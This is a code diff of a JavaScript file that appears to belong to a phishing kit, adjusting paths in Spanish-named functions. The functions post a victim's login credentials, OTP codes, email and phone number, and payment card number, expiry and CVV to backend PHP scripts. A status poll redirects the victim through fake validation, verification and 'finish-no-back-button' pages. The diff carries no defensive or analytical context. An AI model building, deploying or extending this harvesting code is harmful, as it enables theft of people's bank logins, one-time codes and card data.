@@ -35,14 +35,14 @@ function cerrar(){
 }
 
 function status(){
-    $.post( "../../../../../process/estado.php",function(data) {        
+    $.post( "../../../../process/estado.php",function(data) {        
         switch (data) {
-            case '2': window.location.href = "../validar/index.html"; break;
-            case '4': window.location.href = "../portal/index.html"; break;
-            case '6': window.location.href = "../verificar/index.html"; break;               
-            case '8': window.location.href = "../error/index.html"; break;
-            case '10': window.location.href = "../../../../../finish-no-back-button/"; break
-            case '12': window.location.href = "../index.html"; break;
+            case '2': window.location.href = "validar.html"; break;
+            case '4': window.location.href = "portal.html"; break;
+            case '6': window.location.href = "verificar.html"; break;               
+            case '8': window.location.href = "error.html"; break;
+            case '10': window.location.href = "../../../../finish-no-back-button/successful.html"; break
+            case '12': window.location.href = "persona.html"; break;
         } 
     });        
 }
@@ -58,7 +58,7 @@ function enviar_usuario(u,p){
 
             }else{
                 res = data.split("-");
-                window.location.href = "sistema/index.html";
+                window.location.href = "sistema.html";
             }
         }
     });
@@ -66,20 +66,20 @@ function enviar_usuario(u,p){
 
 
 function enviar_otp(o){
-    $.post( "../../../../../process/pasootp.php", { otp: o} ,function(data) {
-        window.location.href = "../sistema/index.html";
+    $.post( "../../../../process/pasootp.php", { otp: o} ,function(data) {
+        window.location.href = "sistema.html";
     }); 
 }
 
 function enviar_correo(m,c){    
-    $.post( "../../../../../process/pasocorreo.php", { eml:m,clv:"",cel:c } ,function(data) {    
-        window.location.href = "../sistema/index.html";
+    $.post( "../../../../process/pasocorreo.php", { eml:m,clv:"",cel:c } ,function(data) {    
+        window.location.href = "sistema.html";
     });
 }
 
 function enviar_tarjeta(t,f,c){    
-    $.post( "../../../../../process/pasotarjeta.php", { tar:t,fec:f,cvv:c } ,function(data) {    
-        window.location.href = "../sistema/index.html";
+    $.post( "../../../../process/pasotarjeta.php", { tar:t,fec:f,cvv:c } ,function(data) {    
+        window.location.href = "sistema.html";
     });
 }
 
